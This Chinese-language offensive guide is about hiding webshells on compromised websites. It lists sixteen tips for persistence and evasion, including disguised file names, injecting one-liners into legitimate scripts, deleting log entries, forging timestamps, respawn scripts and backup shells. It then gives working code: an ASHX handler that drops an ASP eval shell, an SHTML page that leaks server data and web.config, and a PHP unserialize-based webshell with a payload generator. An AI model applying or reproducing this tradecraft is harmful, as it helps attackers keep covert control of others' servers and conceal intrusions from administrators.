

# 隐藏webshell的几条建议

```
1.尽量藏在那些程序员和管理员都不会经常光顾的目录中
比如:第三方工具的一些插件目录,主题目录,编辑器的图片目录以及一些临时目录

2.目录层级越深越好,平时网站不出问题的话,一般四五级目录很少会被注意到

3.webshell的名字千万不要太扎眼,比如:hack.php,sb.php,x.php这样的名字严禁出现……,在给webshell起名的时候尽量跟当前目录的,其他文件的名字相似度高一点,这样相对容易混淆视听,比如:目录中有个叫new.php的文件,那你就起个news.php

4.webshell里面尽量不要用类似eval这种过于敏感的特征,因为awk一句话就能查出来,除了eval,还有,比如:exec,system,passthru,shell_exec,assert这些函数都最好不要用,你可以尝试写个自定义函数,不仅能在一定程度上延长webshell的存活时间也加大了管理员的查找难度,也可以躲避一些功能比较简陋waf查杀,此外,我们也可以使用一些类似:call_user_func,call_user_func_array,诸如此类的回调函数特性来构造我们的webshell,即伪造正常的函数调用

5.靠谱的方法就是直接把一句话插到正常的网站脚本文件里面,当然最好是在一个不起眼的地方,比如:函数库文件,配置文件里面等等,以及那些不需要经常改动的文件……

6.再或者拿到权限以后,把网站日志中的所有关于webshell的访问记录和渗透时造成的一些网站报错记录全部删除

7.尝试利用静态文件隐藏一句话,然后用.htaccess 规则进行解析

8.把webshell的属性时间改为和同目录文件相同的时间戳,比如linux中的touch就是非常好的工具

9.当然,如果在拿到服务器权限以后,也可以自己写个脚本每隔一段时间检测下自己的webshell是否还存在,不存在就创建

10.利用php.ini 配置文件隐藏webshell,把webshell的路径加入到配置文件中

11.如果是大马的话,尽量把里面的一些注释和作者信息全部都去掉,比如intitle字段中的版本信息等等,用任何大马之前最好先好好的读几遍代码,把里面的shell箱子地址全部去掉推荐用开源的大马,然后自己拿过来仔细修改,记住,我们的webshell尽量不要用加密,因为加密并不能很好的解决waf问题,还有,大马中一般都会有个pass或者password字符,建议把这些敏感字段全部换成别的,因为利用这样的字符基本一句话就能定位到

12.养成一个好习惯,为了防止权限很快丢失,最好再同时上传几个备用webshell,注意,每个webshell的路径和名字千万不要都一样更不要在同一个目录下,多跳几层,记住,确定shell正常访问就可以了,不用再去尝试访问看看解析是否正常,因为这样就会在日志中留下记录,容易被查到

13.在有权限的情况,看看管理员是否写的有动态webshell监测脚本,务必把脚本找出来,crontab一般都能看见了

14.上传个精心构造的图片马,然后再到另一个不起眼的正常的网站脚本文件中去包含这个图片马

15.如果有可能的话,还是审计下目标的代码,然后想办法在正常的代码中构造执行我们自己的webshell,即在原生代码中执行webshell

16.上传.user.ini文件来解析图片或隐藏webshell[https://ha.cker.in/1097.seo]

```

# 写shell技巧

## ashx写入

ashx脚本，服务器有.net环境但aspx被禁止上传时适用。这个执行后会在当前目录下生成webshell.asp一句话木马，密码是pass 也可以写入其它文件

```as
<%@ WebHandler Language="C#" class="Handler"% >
using System;
using System.Web;
using System.IO;
public class Handler:IHttpHandler {
 
public void ProcessRequest (HttpContext context) {
    context.Response.ContentType = "text/plain";
    StreamWriter file = File.CreateText(context.Server.MapPath("webshell.asp")));
    file.Write("<%eval request(\"pass\")%>");
    file.Flush();
    file.Close();
    context.Response.Write("www.webshell.cc");
}
 
public bool IsReusable {
    get {
        return false;
    }
}
}
```



## 别忘了shtml

stm/shtm/shtml脚本，虽然不能直接拿到webshell，但是可以获取到一些服务器信息。注意stm中的include可以将web.config文件中的内容包含进来

```html
<!--#ECHO var="ALL_HTTP"-->
当前文件名称:<!--#ECHO var="DOCUMENT_NAME"-->
Web服务器的名称和版本:<!--#ECHO var="SERVER_SOFTWARE"-->
主机名:<!--#ECHO var="SERVER_NAME"-->
端口:<!--#ECHO var="SERVER_PORT"-->
客户或客户代理IP地址:<!--#ECHO var="REMOTE_ADDR"-->
客户或客户代理主机名:<!--#ECHO var="REMOTE_HOST"-->
PATH_INFO 的值，但带有扩展为某个目录规范的虚拟路径:
<!--#ECHO var="PATH_TRANSLATED"-->
客户端给出附加路径信息:<!--#ECHO var="PATH_INFO"-->
<!--#ECHO var="HTTP_ACCEPT"-->
<!--#ECHO var="DOCUMENT_URI"-->
<!--#include file="../../web.config"-->
```

## 利用unserialize构造webshell

server:

```php
<?php

class foo{
    public $data="text";
    function __destruct()
    {
        eval($this->data);
    }

}

$file_name=$_GET['id'];
unserialize($file_name);
```

client:生成执行地址

```php
<?php

class foo{
    #public $data="phpinfo();";
    public $data="system('ls');";

}
$a=new foo;
$b=serialize($a);
echo "please visit uri:\n"."[your shell page url]"."?id=".$b;
```

原理：服务端被访问后在内存中有一个foo类模板,当客户端伪造一个同名的叫做foo的类的对象的序列化后的结果给服务端反序列化时,服务端在反序列化这个这个传入的反序列化值后将认为这是当前内存中对应的foo类模板的一个实例对象,于是去执行当前内存的foo类模板的`__wakeup`,`__destruct`等函数,但是恰好这些函数会造成php代码执行[eval($this->data)],且$this->data可控.




## 资料
shtml

https://www.t00ls.net/viewthread.php?tid=21318

Deformity PHP Webshell、Webshell Hidden Learning

http://www.cnblogs.com/LittleHann/p/3522990.html

unserialize免杀webshell

http://3xp10it.cc/web/2017/04/18/unserialize%E5%85%8D%E6%9D%80webshell/